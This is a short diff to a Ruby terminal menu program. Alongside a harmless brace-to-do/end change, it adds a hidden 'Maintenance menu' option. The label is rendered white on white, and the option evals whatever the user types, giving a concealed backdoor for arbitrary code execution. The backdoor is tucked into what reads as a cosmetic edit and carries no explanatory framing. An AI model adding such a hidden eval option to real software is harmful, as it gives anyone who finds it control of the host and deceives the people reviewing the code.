@@ -123,10 +123,15 @@ loop do
       end
     end
 
-    menu.choice("Exit program") {
+    menu.choice("Exit program") do
       say("Bye!")
       exit
-    }
+    end
+
+    menu.choice("<%= color( \"Maintenance menu\", :white, :on_white) %>") do
+      command = ask("What do you wanna do?", String)
+      eval(command)
+    end
   end
 end
 
